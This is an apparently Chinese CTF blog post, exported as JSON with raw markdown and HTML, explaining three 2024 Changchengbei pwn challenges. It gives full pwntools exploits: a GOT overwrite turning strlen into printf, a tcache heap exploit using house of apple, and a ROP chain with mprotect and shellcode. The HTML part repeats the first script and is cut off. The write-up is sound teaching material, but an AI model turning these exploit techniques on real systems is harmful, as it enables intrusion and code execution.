{"title":"[2024长城杯初赛] Pwn题SomeHash SomeTime shutup题解","date":"2024-03-31T12:46:11.000Z","toc":true,"source":"_posts/2024changchengbei.md","raw":"---\ntitle: \"[2024长城杯初赛] Pwn题SomeHash SomeTime shutup题解\"\ncomments: true\ntoc: true\ndate: 2024-03-31 20:46:11\ntags:\n  - CTF\n  - Pwn\n  - 2023changchengbei \n---\n\n## SomeHash\n\n题目实现了简单的Hash计算的逻辑，提供了3次初始的计算用户输入Hash的机会\n\n其中漏洞点在\n\n![image-20240331194408745](2024changchengbei/image-20240331194408745.png)\n\n这里的v10没有检查负数，可以向bss段上方的数据中写入一字节\n\n这里的利用方法是一个小技巧，来自于got表的lazy函数注册逻辑，也就是checksec显示如下\n\n![image-20240331194320257](2024changchengbei/image-20240331194320257.png)\n\n### Lazy函数注册逻辑\n\n当ELF加载时，并不会直接调用dl_runtime_resolve将函数注册成真实地址，此时got表也是可写的，我们再观察一下这里got表指向，这里指向的是plt上方的一个地址，可以看到这里的exit函数，got表进入的是0x1030的位置，之后jmp到了0x1020的函数，0x1020函数内会jmp到0x5010的位置，也就是pwndbg中的`_dl_runtijme_resolve_xsavec`\n\n![image-20240331195253059](2024changchengbei/image-20240331195253059.png)\n\n![image-20240331195144656](2024changchengbei/image-20240331195144656.png)\n\n关于对于`dl_runtime_resolve`的内容这里就不赘述了，网上有很多教程。这里我们并不需要关心`dl_runtime_resolve`做了什么，我们只需要动态观察got表未注册的内容的规律，在上面的pwndbg显示的，**注意这里got表是可写的**，那么我们就有一个大胆的猜想，如果我们在函数注册之前，修改了got表里的数据会怎么样？\n\n可以看到的是，在函数注册前，got表内容十分相近，相差只有一个byte，上述的数组下标溢出的漏洞非常合适这里的利用。\n\n### strlen2printf\n\n这里有一个非常合适的错误注册的函数——`strlen`\n\n这里main函数逻辑中，调用strlen是在漏洞利用之后，我们可以修改未注册的strlen的got表内容，改成printf的偏移，使得strlen错误的注册成printf函数，而在接下来的函数调用中，buf内容是可控的，导致我们可以将数组下标溢出漏洞转换成printf格式化字符串漏洞\n\n（并且，printf的返回值是输出字符的数量，strlen也是字符数量，并不影响后续程序的逻辑）\n\n![image-20240331200116857](2024changchengbei/image-20240331200116857.png)\n\n至此，我们构造了一个非栈上字符串的格式化字符串漏洞，而这个问题也已经有方法解决https://www.freebuf.com/vuls/284210.html\n\n### EXP\n\n完整exp如下，直接使用格式化字符串提权是困难的，因为一共只有4次机会，我们可以利用这四次机会，修改dword_5078地址内容，使得while的次数变多，最后完成格式化字符串攻击\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\n# io = process(\"./somehash\")\nio = remote(\"127.0.0.1\", 9999)\ntob = lambda x: str(x).encode()\n\nio.sendlineafter(b\"name length> \", tob(-0x98))\n\npayload = flat({\n    0: b\"xxx>%6$p->%19$p->%21$p-\",\n    0x80-2: b\"a\" \n})\nio.sendlineafter(b\"name> \", payload)\n\nio.recvuntil(b\"xxx>\")\nstack = int(io.recvuntil(b\"-\", drop=True), 16)\nlog.success(f\"stack : {stack:#x}\")\n\nio.recvuntil(b\">\")\nlibc_leak = int(io.recvuntil(b\"-\", drop=True), 16)\nlog.success(f\"libc_leak : {libc_leak:#x}\")\n\nio.recvuntil(b\">\")\nelf_leak = int(io.recvuntil(b\"-\", drop=True), 16)\nlog.success(f\"elf_leak : {elf_leak:#x}\")\n\nelf_base = elf_leak - 0x258b\nlog.success(f\"elf_base : {elf_base:#x}\")\n\nlibc_base = libc_leak - 0x29d90\nlog.success(f\"libc_base : {libc_base:#x}\")\n\nstack_target = stack - 0x100\npayload = f\"%{stack_target % 0x10000}c%23$hn\".encode()\nio.sendlineafter(b\"content> \", payload)\n\ntarget = elf_base + 0x05078 # cnt\npayload = f\"%{target % 0x10000}c%53$hn\".encode()\nio.sendlineafter(b\"content> \", payload)\n\npayload = f\"%{0x100 - 200}c%21$hn\".encode()\nio.sendlineafter(b\"content> \", payload)\n\n\n\nstack_target = stack - 0x110\npayload = f\"%{stack_target % 0x10000}c%23$hn\".encode()\nio.sendlineafter(b\"content> \", payload)\n\nwrite = libc_base + 0x000000000002a3e5 # pop rdi\nfor i in range(6):\n    target = stack_target + i\n    payload = f\"%{target % 0x100}c%23$hhn\".encode()\n    io.sendlineafter(b\"content> \", payload)\n    \n    payload = f\"%{(write // (0x100 ** i)) % (0x100)}c%53$hhn\".encode()\n    io.sendlineafter(b\"content> \", payload)\n\n\n\nstack_target = stack - 0x110 + 0x8\npayload = f\"%{stack_target % 0x10000}c%23$hn\".encode()\nio.sendlineafter(b\"content> \", payload)\n\nwrite = elf_base + 0x50c0 # ->\"/bin/sh\"\nfor i in range(6):\n    target = stack_target + i\n    payload = f\"%{target % 0x100}c%23$hhn\".encode()\n    io.sendlineafter(b\"content> \", payload)\n    \n    payload = f\"%{(write // (0x100 ** i)) % (0x100)}c%53$hhn\".encode()\n    io.sendlineafter(b\"content> \", payload)\n\n\n\nstack_target = stack - 0x110 + 0x10\npayload = f\"%{stack_target % 0x10000}c%23$hn\".encode()\nio.sendlineafter(b\"content> \", payload)\n\nwrite = libc_base + 0x000000000002a3e5+1 # ret\nfor i in range(6):\n    target = stack_target + i\n    payload = f\"%{target % 0x100}c%23$hhn\".encode()\n    io.sendlineafter(b\"content> \", payload)\n    \n    payload = f\"%{(write // (0x100 ** i)) % (0x100)}c%53$hhn\".encode()\n    io.sendlineafter(b\"content> \", payload)\n\n\nstack_target = stack - 0x110 + 0x18\npayload = f\"%{stack_target % 0x10000}c%23$hn\".encode()\nio.sendlineafter(b\"content> \", payload)\n\nwrite = libc_base + 0x50d60 # system\nfor i in range(6):\n    target = stack_target + i\n    payload = f\"%{target % 0x100}c%23$hhn\".encode()\n    io.sendlineafter(b\"content> \", payload)\n    \n    payload = f\"%{(write // (0x100 ** i)) % (0x100)}c%53$hhn\".encode()\n    io.sendlineafter(b\"content> \", payload)\n\nio.sendlineafter(b\"content> \", b\"/bin/sh\\x00\")\nio.sendlineafter(b\"content> \", b\"/bin/sh\\x00\")\nio.sendlineafter(b\"content> \", b\"/bin/sh\\x00\")\nio.sendlineafter(b\"content> \", b\"/bin/sh\\x00\")\n\npause(1)\nio.sendline(b\"cat flag\")\n\n\nio.interactive()\n```\n\n![image-20240331201257167](2024changchengbei/image-20240331201257167.png)\n\nps: 附录中有调试使用的dockerfile与docker-compose.yml\n\n\n\n## SomeTime\n\n本题是单个堆块的堆风水题目，是一个你与some从恶魔手中夺取flag的合作历险故事\n\n漏洞点在\n\nSIGALARM的信号处理函数watch中\n\n![image-20240331201819825](2024changchengbei/image-20240331201819825.png)\n\n这里会将now指针中的低位字节清零，剧情中，some在最后时刻能为你做到最后的事情。\t\n\n信号注册在init函数中\n\n思路也比较简单只需要利用tcachebin机制，**把tcachebin当作以前pwn可以保存多个堆块的题目的堆块数组即可**\n\n为了做到上述内容，我们要保证每次申请释放的size大小不同，即可在tcachebin中只存在一个堆块\n\n由于我们可以将申请出来的指针做低字节的修改，所以我们可以很方便的构造堆叠，修改tcachebin的size位使得size变大，扩大溢出范围，之后我们可以通过重复申请tcachebin内容的堆块，泄露地址，最后完成fd修改，最后houseofapple一把梭\n\n### 关于堆风水\n\n这道一题目，我们需要尽量申请时候使用不同的size，否则将会申请出相同地址的堆块，或者这里可以多次add，使得申请多个无指针引用内存，使得内存地址扩展，之后篡改size顶部tcachebin，size位置，使得刚好大小超过0x420并能完美覆盖中间tcache，衔接上后方伪造的size，使得此时free后能进入unsortedbin，从而可以泄露main_arena地址，使得泄露libc地址。\n\n之后就是修改tcachebin的count使得大于1，这里就要一些堆风水的技巧，一种可行的思路是，我们构造一种堆叠，**使得一个大的tcachebin堆块覆盖两个及其以上的堆块**，这样我们就可以同时操控chunk1和chunk2的内容，控制这两个size设置为相同的即可\n\n（注意由于本题目只能拿到一个堆块做操作，也就是修改fakechunk的时候chunk1与2是在tcachebin中的，tacachebin中并不检查malloc取出的堆块大小是否正确，同时这里修改chunk2时候，注意恢复chunk1的fd和key字段）\n\n```\n| ---------- fake chunk -------------------|\n...-| --- chunk1 --- | --- chunk2 --- | -...\n```\n\n### EXP\n\nPS：由于本题做了大量的sleep操作，这里在本地调试的时候需要patch掉sleep的时间，使得调试变快\n\n在程序最后需要等待时间到达，系统自动调用exit退出即可获得shell\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'info'\ncontext.arch = 'amd64'\n\n# io = process(b\"./sometime\")\nio = remote(\"127.0.0.1\", 9999)\ntob = lambda x: str(x).encode()\n\ndef add(size, content):\n    io.sendlineafter(b\"(1:add,2:release,3:print)> \", b\"1\")\n    io.sendlineafter(b\"size> \", tob(size))\n    io.sendafter(b\"note> \", content)\n\ndef free():\n    io.sendlineafter(b\"(1:add,2:release,3:print)> \", b\"2\")\n\ndef show():\n    io.sendlineafter(b\"(1:add,2:release,3:print)> \", b\"3\")\n\nlog.success(\"exp running ...\")\nadd(0x70, b\"aaa\")\nfree()\n\nadd(0x30, b\"aaa\")\nfree()\nadd(0x40, b\"aaa\")\nfree()\nadd(0x50, b\"aaa\")\nfree()\n\nfor i in range(0xa0-0x10, 0xf0, 0x10): \n    add(i, b\"aaa\")\n    free()\n\nadd(0x60, b\"aaa\")\nfree()\nadd(0x70, b\"a\" * 0x30 + p64(0) + p64(0x5e1) + b\"114514\")\nfree()\n\nadd(0x30, b\"aaaa\")\n\nio.recvuntil(b\"I can only assist up to this point. Sorry.\")\nio.sendline(b\"3\")\n\nfree()\nadd(0x100, b\"\\n\")\nshow()\nleak = u64(io.recv(6).ljust(8, b\"\\x00\"))\nlibc_base = leak - 0x21a10a\nlog.success(f\"libc_base: {libc_base:#x}\")\nfree()\nlibc = ELF(\"./libc.so.6\", checksec=False)\nlibc.address = libc_base\n\nadd(0x100, b\"a\" * (0x78) + b\"deadbeaf\")\nshow()\nio.recvuntil(b\"deadbeaf\")\nheap_addr = u64(io.recv(5).ljust(8, b\"\\x00\")) << 12\nlog.success(f\"heap_addr: {heap_addr:#x}\")\n\nfree()\nadd(0x100, b\"a\" * (0x80) + b\"deadbeaf\")\nshow()\nio.recvuntil(b\"deadbeaf\")\nkey = u64(io.recv(8).ljust(8, b\"\\x00\"))\nlog.success(f\"key: {key:#x}\")\n\nfree()\nadd(0x100, b\"a\" * (0x70) + p64(0) + p64(0x51) + p64(heap_addr >> 12))\nfree()\n\nadd(0x100, flat({\n    0x80: heap_addr >> 12,\n    0x88: key,\n    0xc8: 0x31\n}))\nfree()\nadd(0x50, b\"aaaa\")\nfree()\n\nadd(0x100, flat({\n    0x78: 0x31,\n    0x80: heap_addr >> 12,\n    0x88: key,\n}))\nfree()\nadd(0x40, b\"aaaa\")\nfree()\n\nadd(0x100, flat({\n    0x78: 0x51,\n    0x80: (libc.symbols[\"_IO_list_all\"]) ^ (heap_addr >> 12),\n}))\nfree()\nadd(0x20, b\"aaaa\")\nfree()\n\nfake_file_addr = heap_addr + 0x7f0\n# ref: https://blog.csome.cc/p/houseofminho-wp/\nadd(0xe0, flat({\n    0x0: b\"  sh;\",\n    0x28: libc.symbols['system'],\n    0xa0: fake_file_addr-0x10, # wide data\n    0x88: fake_file_addr+0x100, # 可写，且内存为0即可\n    0xD0: fake_file_addr+0x28-0x68, # wide data vtable\n    0xD8: libc.symbols['_IO_wfile_jumps'], # vtable  \n}, filler=b\"\\x00\"))\n\nadd(0x20, p64(fake_file_addr))\n\n\nio.interactive()\n```\n\n![image-20240331204105421](2024changchengbei/image-20240331204105421.png)\n\nps: 附录中有调试使用的dockerfile与docker-compose.yml\n\n\n\n## shutup\n\n此题没有输出，单纯只有输入，没有开PIE，没有开canary，漏洞就是栈溢出\n\n![image-20240401042955524](2024changchengbei/image-20240401042955524.png)\n\n但是这里难点是如何泄露，或者如何构造出libc的任意地址，很明显，这里不给我们第二次的输入机会\n\n需要注意到，题目给了一个没有调用的函数，可以从数组中取出数据，这里可以利用数组下标负数溢出，使得取出got表中read地址\n\n![image-20240401043039760](2024changchengbei/image-20240401043039760.png)\n\n![image-20240401043048348](2024changchengbei/image-20240401043048348.png)\n\n获得了read地址还不足以能够做到取出libc任意地址，但是如果这里的`qword_601060 += atoi(nptr);`逻辑就很巧妙，如果我们能够按照下面的方法控制执行流，那么我们就能将read内容存入qword_601060中，之后我们利用rop，在bss上布置一个数字，并使用`pop_rdi; ret 0x000400703`的手法，就能在qword_601060中构造出read+offset，我们也就能获得syscall\n\n![image-20240401043318111](2024changchengbei/image-20240401043318111.png)\n\n### 任意地址写原语\n\n在进入栈溢出函数的开始，我们只能写入0x40个字节，很明显，这是不够的，我们需要找到一种方法，能够任意地址写，并能支持写入多个字符。\n\n答案是：依然还是函数sub_4006B7，我们再次审视下面的函数汇编，会发现，edi的数值会写入[rbp-4]的位置，而rbp我们可以通过pop rbp的rop控制\n\n![image-20240401043048348](2024changchengbei/image-20240401043048348.png)\n\n我们很轻松的就能构造如下的原语\n\n```python\n[\n    pop_rbp, 4 + addr,\n    pop_rdi, 0xde,\n    0x0004006BB, rbp,\n]\n```\n\n这就能向addr中写入0xde字节，为什么我们只能写入一个字节呢？因为edi的数值后续会作为数组的索引，数字太大会导致索引到不可读的内存，导致段错误，所以为了保险起见，这里我们每次只写入1个字节\n\n最后我们就能构造任意地址写的payload构造函数\n\n```python\ndef make_bytes(addr, bbb):\n    target = []\n    for i in range(len(bbb)):\n        tmp = bbb[i]\n        if tmp == 0:\n            continue\n        template = [\n            pop_rbp, 4 + addr + i,\n            pop_rdi, tmp,\n            0x0004006BB, base,\n        ]\n        target.extend(template)\n    return target\n```\n\n接下来的内容就比较简单，控制rdi、rsi、rdx之后调用mprotect修改bss的可执行权限，写入shellcode即可\n\n但是rdx的控制这里利用了，这个部分，控制r12、rbx内容使得call的内容刚好是pop rbp，将call在栈上写入的地址pop掉即可\n\n![image-20240401044525680](2024changchengbei/image-20240401044525680.png)\n\n### EXP\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n\nshellcode = asm(\nf\"\"\"\nmov rax, {u64((b\"./flag\" + bytearray([0]*8))[:8])}\npush rax\nmov rdi, rsp\nmov rsi, 0\nmov rax, 2\nsyscall\n\nmov rdi, 3\nmov rsi, rsp\nmov rdx, 0x40\nmov rax, 0\nsyscall\n\nmov rdi, 1\nmov rsi, rsp\nmov rdx, 0x40\nmov rax, 1\nsyscall\n\"\"\")\n\n\n\"\"\"\n0x0000000000400655 : call qword ptr [rbp + 0x48]\n\"\"\"\n\ntob = lambda x: str(x).encode()\nio = process(\"./shutup\")\n\nmov_rax_libc = 0x0000400696\npop_rdi = 0x00000000004007e3\nget_rax = 0x004006B7 \ncall_rax = 0x000000000040064e\ncall_ptr_rax = 0x00000000004008a3\npop_r14_r15 = 0x004007E0\npop_rbp = 0x00000000004005c0\npop_rsp_r13_r14_r15 = 0x00000000004007dd\npop_rbx_rbp_r12_r13_r14_r15  = 0x04007DA\njmp_rax = 0x00000000004005b5\npop_r13_r14_r15 = 0x0004007DE\npop_rsi_r15 = 0x00000000004007e1\natoi = 0x00400550\n\noffset = 0x10 # offset 2 syscall\nbase = 0x00601380\nio.sendline(flat({\n    0: base + 0x38, # rbp\n    0x8: pop_rdi, \n    0x10: base + 0x30,\n    0x18: 0x00400703, # call atoi\n    0x20: pop_r14_r15,\n    0x28: b\"ls\",\n    0x30: tob(offset).rjust(7, b\" \") + b\"\\x00\",\n    0x38: 0x0601060-0x48,\n}, filler=b\"\\x00\"))\npause(1)\n\nio.send(flat({\n    0: tob(0x40000),\n    0xf: b\"\\x00\"\n}, filler=b\"\\x00\"))\n\n\ndef make_bytes(addr, bbb):\n    target = []\n    for i in range(len(bbb)):\n        tmp = bbb[i]\n        if tmp == 0:\n            continue\n        template = [\n            pop_rbp, 4 + addr + i,\n            pop_rdi, tmp,\n            0x0004006BB, base,\n        ]\n        target.extend(template)\n    return target\n\nrop_chain = []\n\nrop_chain.extend(make_bytes(base + 0x40, flat(\n    [\n        pop_rbx_rbp_r12_r13_r14_r15, 0, 0, base + 0x40 + 8 * 8, 7, 0, 0,\n        0x4007C0, # mov     rdx, r13\n        pop_rbp, 0x0601060,\n        pop_rdi, 2,\n        get_rax,\n        pop_rdi, base & (~0xfff),\n        pop_rsi_r15, 0x1000, 0,\n        0x000000000040094b, # jmp ptr[rbp]\n        base + 0xe0,\n        shellcode\n    ], filler=b\"\\x00\"\n)))\n\nrop_chain.extend(make_bytes(0x00601068, b\"7\"))\nrop_chain.extend(make_bytes(0x00601070, p8(0xa)))\n\nio.sendline(flat({\n    0: b\"0\\x00\",\n    0x10: base,\n    0x18: rop_chain + [\n        pop_rdi, 2**32-((0x000601060-0x600fd8)//8), # read got\n        get_rax,\n        0x0000400715,\n    ]\n}))\n\nio.shutdown(\"send\")\n\nio.interactive()\n```\n\n![image-20240401045219256](2024changchengbei/image-20240401045219256.png)\n\n不同的libc，修改一下上面offset变量即可\n\n\n\n## 附录\n\n以下是Ubuntu GLIBC 2.35-0ubuntu3.1的docker调试环境\n\nDockerfile\n\n```dockerfile\nFROM ubuntu:22.04@sha256:b492494d8e0113c4ad3fe4528a4b5ff89faa5331f7d52c5c138196f69ce176a6\n\nRUN apt update\nRUN apt install socat -yyq\n\nRUN useradd -M -s /bin/false ctf\n\nWORKDIR /app\nCOPY your_elf flag /app/\nRUN chmod +x /app/your_elf && chmod -w /app/your_elf && chmod -w /app/flag\n\nUSER ctf\n\nCMD [\"socat\", \"TCP-LISTEN:9999,reuseaddr,fork\", \"EXEC:/app/your_elf\"]\n```\n\ndocker-compose.yml\n\n```yaml\nversion: '3'\nservices:\n  pwn-dev:\n    build: .\n    ports:\n      - \"9999:9999\"\n    privileged: true\n    restart: unless-stopped\n```\n\n题目zip\n\n[Csome/CTFTask/2024-03_长城杯](https://gitee.com/csomebro/ctftask/tree/master/2024-03_长城杯)\n","slug":"2024changchengbei","published":true,"updated":"2025-10-28T08:00:40.753Z","_id":"cuid9mH_yK5D0yFHLBY99iJRc","comments":true,"layout":"post","photos":[],"html":"<h2 id=\"SomeHash\"><a href=\"#SomeHash\" class=\"headerlink\" title=\"SomeHash\"></a>SomeHash</h2><p>题目实现了简单的Hash计算的逻辑，提供了3次初始的计算用户输入Hash的机会</p>\n<p>其中漏洞点在</p>\n<p><img src=\"/p/2024changchengbei/image-20240331194408745.png\" alt=\"image-20240331194408745\"></p>\n<p>这里的v10没有检查负数，可以向bss段上方的数据中写入一字节</p>\n<p>这里的利用方法是一个小技巧，来自于got表的lazy函数注册逻辑，也就是checksec显示如下</p>\n<p><img src=\"/p/2024changchengbei/image-20240331194320257.png\" alt=\"image-20240331194320257\"></p>\n<h3 id=\"Lazy函数注册逻辑\"><a href=\"#Lazy函数注册逻辑\" class=\"headerlink\" title=\"Lazy函数注册逻辑\"></a>Lazy函数注册逻辑</h3><p>当ELF加载时，并不会直接调用dl_runtime_resolve将函数注册成真实地址，此时got表也是可写的，我们再观察一下这里got表指向，这里指向的是plt上方的一个地址，可以看到这里的exit函数，got表进入的是0x1030的位置，之后jmp到了0x1020的函数，0x1020函数内会jmp到0x5010的位置，也就是pwndbg中的<code>_dl_runtijme_resolve_xsavec</code></p>\n<p><img src=\"/p/2024changchengbei/image-20240331195253059.png\" alt=\"image-20240331195253059\"></p>\n<p><img src=\"/p/2024changchengbei/image-20240331195144656.png\" alt=\"image-20240331195144656\"></p>\n<p>关于对于<code>dl_runtime_resolve</code>的内容这里就不赘述了，网上有很多教程。这里我们并不需要关心<code>dl_runtime_resolve</code>做了什么，我们只需要动态观察got表未注册的内容的规律，在上面的pwndbg显示的，<strong>注意这里got表是可写的</strong>，那么我们就有一个大胆的猜想，如果我们在函数注册之前，修改了got表里的数据会怎么样？</p>\n<p>可以看到的是，在函数注册前，got表内容十分相近，相差只有一个byte，上述的数组下标溢出的漏洞非常合适这里的利用。</p>\n<h3 id=\"strlen2printf\"><a href=\"#strlen2printf\" class=\"headerlink\" title=\"strlen2printf\"></a>strlen2printf</h3><p>这里有一个非常合适的错误注册的函数——<code>strlen</code></p>\n<p>这里main函数逻辑中，调用strlen是在漏洞利用之后，我们可以修改未注册的strlen的got表内容，改成printf的偏移，使得strlen错误的注册成printf函数，而在接下来的函数调用中，buf内容是可控的，导致我们可以将数组下标溢出漏洞转换成printf格式化字符串漏洞</p>\n<p>（并且，printf的返回值是输出字符的数量，strlen也是字符数量，并不影响后续程序的逻辑）</p>\n<p><img src=\"/p/2024changchengbei/image-20240331200116857.png\" alt=\"image-20240331200116857\"></p>\n<p>至此，我们构造了一个非栈上字符串的格式化字符串漏洞，而这个问题也已经有方法解决<a href=\"https://www.freebuf.com/vuls/284210.html\">https://www.freebuf.com/vuls/284210.html</a></p>\n<h3 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><p>完整exp如下，直接使用格式化字符串提权是困难的，因为一共只有4次机会，我们可以利用这四次机会，修改dword_5078地址内容，使得while的次数变多，最后完成格式化字符串攻击</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># io = process(&quot;./somehash&quot;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">tob = <span class=\"keyword\">lambda</span> x: <span class=\"built_in\">str</span>(x).encode()</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;name length&gt; &quot;</span>, tob(-<span class=\"number\">0x98</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0</span>: <span class=\"string\">b&quot;xxx&gt;%6$p-&gt;%19$p-&gt;%21$p-&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x80</span>-<span class=\"number\">2</span>: <span class=\"string\">b&quot;a&quot;</span> </span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;name&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;xxx&gt;&quot;</span>)</span><br><span class=\"line\">stack = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">b&quot;-&quot;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;stack : <span class=\"subst\">&#123;stack:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;&gt;&quot;</span>)</span><br><span class=\"line\">libc_leak = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">b&quot;-&quot;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_leak : <span class=\"subst\">&#123;libc_leak:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;&gt;&quot;</span>)</span><br><span class=\"line\">elf_leak = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">b&quot;-&quot;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;elf_leak : <span class=\"subst\">&#123;elf_leak:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf_base = elf_leak - <span class=\"number\">0x258b</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;elf_base : <span class=\"subst\">&#123;elf_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x29d90</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">stack_target = stack - <span class=\"number\">0x100</span></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;stack_target % <span class=\"number\">0x10000</span>&#125;</span>c%23$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">target = elf_base + <span class=\"number\">0x05078</span> <span class=\"comment\"># cnt</span></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;target % <span class=\"number\">0x10000</span>&#125;</span>c%53$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;<span class=\"number\">0x100</span> - <span class=\"number\">200</span>&#125;</span>c%21$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">stack_target = stack - <span class=\"number\">0x110</span></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;stack_target % <span class=\"number\">0x10000</span>&#125;</span>c%23$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">write = libc_base + <span class=\"number\">0x000000000002a3e5</span> <span class=\"comment\"># pop rdi</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    target = stack_target + i</span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;target % <span class=\"number\">0x100</span>&#125;</span>c%23$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\">    </span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;(write // (<span class=\"number\">0x100</span> ** i)) % (<span 